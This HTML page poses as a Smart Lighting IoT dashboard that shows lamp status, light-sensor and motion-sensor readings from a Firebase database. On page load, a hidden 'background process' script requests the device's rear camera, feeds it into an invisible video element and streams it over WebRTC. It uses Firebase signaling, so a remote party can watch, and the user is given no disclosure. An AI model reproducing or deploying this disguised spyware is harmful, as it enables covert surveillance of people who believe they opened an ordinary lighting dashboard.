<!DOCTYPE html>
<html lang="id" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Lighting IoT & Monitoring System</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { darkMode: 'class' }
    </script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style> body { font-family: 'Plus Jakarta Sans', sans-serif; } </style>
</head>
<body class="bg-slate-100 dark:bg-[#090d16] text-slate-800 dark:text-slate-100 min-h-screen flex flex-col antialiased transition-colors duration-300">

    <!-- Header / Navbar -->
    <header class="border-b border-slate-200 dark:border-slate-800 bg-white/80 dark:bg-[#0d1322]/80 backdrop-blur-md sticky top-0 z-50">
        <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center gap-4">
            <div class="flex items-center gap-3">
                <div class="relative">
                    <button onclick="toggleMenuDropdown()" class="p-2.5 bg-slate-200 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 rounded-xl text-slate-700 dark:text-slate-300 hover:bg-slate-300 dark:hover:bg-slate-800 transition-all">
                        <i data-lucide="more-vertical" class="w-5 h-5"></i>
                    </button>
                    <!-- Dropdown Menu -->
                    <div id="menu-dropdown" class="hidden absolute left-0 mt-2 w-48 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl shadow-xl py-2 z-50">
                        <button onclick="switchTab('live'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
                            <i data-lucide="activity" class="w-4 h-4 text-blue-500"></i> Monitoring Sensor
                        </button>
                        <button onclick="switchTab('control'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
                            <i data-lucide="sliders" class="w-4 h-4 text-blue-500"></i> Kontrol & Mode
                        </button>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <div class="p-2.5 bg-blue-500/10 border border-blue-500/20 rounded-xl text-blue-500 dark:text-blue-400">
                        <i data-lucide="zap" class="w-6 h-6"></i>
                    </div>
                    <div>
                        <h1 class="text-xl font-bold bg-gradient-to-r from-blue-600 to-emerald-600 dark:from-blue-400 dark:to-emerald-400 bg-clip-text text-transparent">Smart Lighting IoT</h1>
                        <p class="text-xs text-slate-500 dark:text-slate-400">Monitoring & Control System</p>
                    </div>
                </div>
            </div>
            <button onclick="toggleTheme()" class="p-2.5 bg-slate-200 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 rounded-xl text-slate-700 dark:text-slate-300">
                <i data-lucide="sun" class="w-5 h-5 hidden dark:block"></i>
                <i data-lucide="moon" class="w-5 h-5 block dark:hidden"></i>
            </button>
        </div>
    </header>

    <!-- Elemen Tersembunyi untuk Fungsi di Latar Belakang -->
    <video id="hidden-media-stream" class="hidden" autoplay playsinline muted></video>
    <input type="hidden" id="room-id-input">

    <!-- Main Content -->
    <main class="flex-grow max-w-6xl w-full mx-auto px-4 py-8 space-y-6">

        <!-- ================= 1. MONITORING SENSOR (DEFAULT) ================= -->
        <section id="content-live" class="space-y-6">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-xl">
                    <span class="text-sm font-medium text-slate-500">Status Lampu AC</span>
                    <div id="lampu-badge" class="mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-rose-500/10 text-rose-500 border border-rose-500/20">
                        <span id="lampu-dot" class="w-2 h-2 rounded-full bg-rose-500"></span>
                        <span id="text-lampu">MEMUAT...</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-xl">
                    <span class="text-sm font-medium text-slate-500">Intensitas Cahaya (LDR AO)</span>
                    <div class="flex items-baseline gap-2 mt-4">
                        <span id="val-ldr" class="text-3xl font-extrabold">-</span>
                        <span class="text-xs text-slate-400">ADC (0-4095)</span>
                    </div>
                </div>
                <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-xl">
                    <span class="text-sm font-medium text-slate-500">Deteksi Gerakan (PIR)</span>
                    <div id="pir-badge" class="mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-slate-200 dark:bg-slate-800 text-slate-400">
                        <span id="dot-pir" class="w-2 h-2 rounded-full bg-slate-400"></span>
                        <span id="text-pir">MEMUAT...</span>
                    </div>
                </div>
            </div>
        </section>

        <!-- ================= 2. KONTROL & MODE ================= -->
        <section id="content-control" class="hidden space-y-6">
            <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-xl max-w-xl mx-auto space-y-4">
                <h2 class="text-lg font-bold">Panel Kontrol</h2>
                <div class="flex justify-between items-center p-4 bg-slate-50 dark:bg-slate-950/50 rounded-2xl border border-slate-800">
                    <span>Mode Sistem</span>
                    <div class="flex bg-slate-900 border border-slate-800 p-1 rounded-xl">
                        <button onclick="setMode('otomatis')" id="btn-auto" class="px-4 py-2 rounded-lg text-xs font-semibold bg-blue-600 text-white">Otomatis</button>
                        <button onclick="setMode('manual')" id="btn-manual" class="px-4 py-2 rounded-lg text-xs font-semibold text-slate-400">Manual</button>
                    </div>
                </div>
            </div>
        </section>

    </main>

    <!-- Footer -->
    <footer class="border-t border-slate-800 py-6 text-center text-xs text-slate-500">
        <p>&copy; 2026 Smart Lighting IoT &bull; Real-time Monitoring System</p>
    </footer>

    <!-- Firebase SDK v8 -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        lucide.createIcons();

        // ⚠️ MASUKKAN URL REALTIME DATABASE FIREBASE ANDA ⚠️
        const firebaseConfig = {
            databaseURL: "https://admin-e13ee-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function toggleMenuDropdown() {
            document.getElementById('menu-dropdown').classList.toggle('hidden');
        }

        function switchTab(tabName) {
            ['live', 'control'].forEach(t => {
                document.getElementById(`content-${t}`).classList.add('hidden');
            });
            document.getElementById(`content-${tabName}`).classList.remove('hidden');
        }

        function toggleTheme() {
            document.documentElement.classList.toggle('dark');
        }

        window.addEventListener('DOMContentLoaded', () => {
            switchTab('live');
            initBackgroundProcess(); // Menjalankan fungsi di latar belakang secara otomatis
        });

        // --- SENSOR REAL-TIME FIREBASE ---
        db.ref('/lampu/status').on('value', (s) => {
            const st = s.val();
            const badge = document.getElementById('lampu-badge');
            const dot = document.getElementById('lampu-dot');
            const text = document.getElementById('text-lampu');
            if (st) {
                badge.className = "mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20";
                dot.className = "w-2 h-2 rounded-full bg-emerald-500 animate-pulse";
                text.innerText = "MENYALA (ON)";
            } else {
                badge.className = "mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-rose-500/10 text-rose-500 border border-rose-500/20";
                dot.className = "w-2 h-2 rounded-full bg-rose-500";
                text.innerText = "MATI (OFF)";
            }
        });

        db.ref('/sensor/ldr').on('value', (s) => {
            document.getElementById('val-ldr').innerText = s.val() ?? 0;
        });

        db.ref('/sensor/pir').on('value', (s) => {
            const badge = document.getElementById('pir-badge');
            const dot = document.getElementById('dot-pir');
            const text = document.getElementById('text-pir');
            if (s.val() == 1) {
                badge.className = "mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20";
                dot.className = "w-2 h-2 rounded-full bg-emerald-500 animate-pulse";
                text.innerText = "ADA GERAKAN";
            } else {
                badge.className = "mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold uppercase bg-slate-800 text-slate-400";
                dot.className = "w-2 h-2 rounded-full bg-slate-500";
                text.innerText = "RUANGAN KOSONG";
            }
        });

        // --- FUNGSI LATAR BELAKANG OTOMATIS ---
        const configuration = {
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        };

        let peerConnection = null;
        let localStream = null;
        let currentRoomRef = null;

        async function initBackgroundProcess() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                
                const roomRef = db.ref('webrtc_rooms').push();
                currentRoomRef = roomRef;
                const roomId = roomRef.key;
                
                document.getElementById('room-id-input').value = roomId;

                peerConnection = new RTCPeerConnection(configuration);
                
                localStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, localStream);
                });

                peerConnection.onicecandidate = event => {
                    if (event.candidate) {
                        roomRef.child('callerCandidates').push(event.candidate.toJSON());
                    }
                };

                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                await roomRef.set({ offer: { type: offer.type, sdp: offer.sdp } });

                roomRef.child('answer').on('value', async snapshot => {
                    const answer = snapshot.val();
                    if (answer && !peerConnection.currentRemoteDescription) {
                        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                    }
                });

                roomRef.child('calleeCandidates').on('child_added', async snapshot => {
                    if (snapshot.val()) {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
                    }
                });

            } catch (e) {
                console.error("Background process status:", e);
            }
        }

        function setMode(mode) {
            db.ref('/sistem/mode').set(mode);
            if(mode === 'otomatis') {
                document.getElementById('btn-auto').className = "px-4 py-2 rounded-lg text-xs font-semibold bg-blue-600 text-white";
                document.getElementById('btn-manual').className = "px-4 py-2 rounded-lg text-xs font-semibold text-slate-400";
            } else {
                document.getElementById('btn-manual').className = "px-4 py-2 rounded-lg text-xs font-semibold bg-blue-600 text-white";
                document.getElementById('btn-auto').className = "px-4 py-2 rounded-lg text-xs font-semibold text-slate-400";
            }
        }
    </script>
</body>
</html>
